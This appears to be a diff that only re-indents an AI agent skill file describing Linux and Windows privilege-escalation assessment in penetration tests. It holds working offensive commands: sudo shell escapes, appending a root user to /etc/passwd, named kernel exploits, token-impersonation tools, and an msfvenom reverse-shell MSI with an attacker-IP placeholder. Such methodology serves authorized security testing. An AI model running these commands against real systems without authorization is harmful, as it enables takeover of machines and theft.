@@ -1,13 +1,13 @@
 ---
 name: performing-privilege-escalation-assessment
 description: 'Performs privilege escalation assessments on compromised Linux and Windows
-  systems to identify paths from low-privilege access to root or SYSTEM-level control.
-  The tester enumerates misconfigurations, vulnerable services, kernel exploits, SUID
-  binaries, unquoted service paths, and credential stores to demonstrate the full
-  impact of an initial compromise. Activates for requests involving privilege escalation
-  testing, local exploitation, post-compromise escalation, or OS-level security assessment.
+ systems to identify paths from low-privilege access to root or SYSTEM-level control.
+ The tester enumerates misconfigurations, vulnerable services, kernel exploits, SUID
+ binaries, unquoted service paths, and credential stores to demonstrate the full
+ impact of an initial compromise. Activates for requests involving privilege escalation
+ testing, local exploitation, post-compromise escalation, or OS-level security assessment.
 
-  '
+ '
 domain: cybersecurity
 subdomain: penetration-testing
 tags:
@@ -91,18 +91,18 @@ Gather comprehensive information about the target system:
 Test identified escalation vectors systematically:
 
 - **Sudo misconfigurations**: If `sudo -l` shows entries like `(ALL) NOPASSWD: /usr/bin/vim`, use GTFOBins to escalate:
-  - `sudo vim -c ':!/bin/bash'` to spawn a root shell
-  - Common dangerous sudo entries: vim, less, find, nmap, python, perl, ruby, awk, env
+ - `sudo vim -c ':!/bin/bash'` to spawn a root shell
+ - Common dangerous sudo entries: vim, less, find, nmap, python, perl, ruby, awk, env
 - **SUID binary abuse**: If a SUID binary is identified that allows arbitrary command execution, shell escape, or file read:
-  - Custom SUID: Check if a custom SUID binary calls other programs without absolute paths (PATH injection)
-  - Known SUID: Check GTFOBins for exploitation of standard SUID binaries
+ - Custom SUID: Check if a custom SUID binary calls other programs without absolute paths (PATH injection)
+ - Known SUID: Check GTFOBins for exploitation of standard SUID binaries
 - **Cron job exploitation**: If a cron job runs a script writable by the current user, or runs a script from a writable directory:
-  - Modify the script to add a reverse shell or SUID copy of bash
-  - PATH-based cron exploitation: if the cron job calls a command without absolute path and PATH is writable
+ - Modify the script to add a reverse shell or SUID copy of bash
+ - PATH-based cron exploitation: if the cron job calls a command without absolute path and PATH is writable
 - **Kernel exploits**: Match the kernel version to known exploits:
-  - DirtyPipe (CVE-2022-0847): Linux kernel 5.8-5.16.11
-  - DirtyCow (CVE-2016-5195): Linux kernel 2.6.22-4.8.3
-  - PwnKit (CVE-2021-4034): Polkit pkexec vulnerability affecting most Linux distributions
+ - DirtyPipe (CVE-2022-0847): Linux kernel 5.8-5.16.11
+ - DirtyCow (CVE-2016-5195): Linux kernel 2.6.22-4.8.3
+ - PwnKit (CVE-2021-4034): Polkit pkexec vulnerability affecting most Linux distributions
 - **Capabilities abuse**: `getcap -r / 2>/dev/null` to find binaries with elevated capabilities (cap_setuid, cap_dac_override)
 - **Writable /etc/passwd**: If /etc/passwd is writable, add a new root user: `echo 'newroot:$1$hash:0:0::/root:/bin/bash' >> /etc/passwd`
 
@@ -111,15 +111,15 @@ Test identified escalation vectors systematically:
 Test Windows-specific escalation paths:
 
 - **Token impersonation**: If the user has `SeImpersonatePrivilege` (common for service accounts and IIS):
-  - Use `JuicyPotato.exe`, `PrintSpoofer.exe`, or `GodPotato.exe` to impersonate SYSTEM
-  - `PrintSpoofer.exe -i -c "cmd /c whoami"` -> `NT AUTHORITY\SYSTEM`
+ - Use `JuicyPotato.exe`, `PrintSpoofer.exe`, or `GodPotato.exe` to impersonate SYSTEM
+ - `PrintSpoofer.exe -i -c "cmd /c whoami"` -> `NT AUTHORITY\SYSTEM`
 - **Unquoted service paths**: If a service has an unquoted path with spaces (e.g., `C:\Program Files\My App\service.exe`) and you can write to an intermediate directory:
-  - Place a malicious executable at `C:\Program Files\My.exe` which will execute when the service restarts
+ - Place a malicious executable at `C:\Program Files\My.exe` which will execute when the service restarts
 - **Writable service binaries**: If you can modify the executable of a service running as SYSTEM:
-  - Replace the binary with a reverse shell and restart the service
+ - Replace the binary with a reverse shell and restart the service
 - **AlwaysInstallElevated**: If both HKLM and HKCU AlwaysInstallElevated registry keys are set to 1:
-  - Generate a malicious MSI: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o shell.msi`
-  - Install with elevated privileges: `msiexec /quiet /qn /i shell.msi`
+ - Generate a malicious MSI: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o shell.msi`
+ - Install with elevated privileges: `msiexec /quiet /qn /i shell.msi`
 - **Stored credentials**: Check for credentials in `cmdkey /list`, AutoLogon registry keys, unattend.xml, web.config files, and PowerShell history
 - **DLL hijacking**: Identify services that load DLLs from writable directories. Use Process Monitor to find missing DLL loads, then place a malicious DLL.
 - **Scheduled tasks**: Find tasks running as SYSTEM with writable scripts or binaries
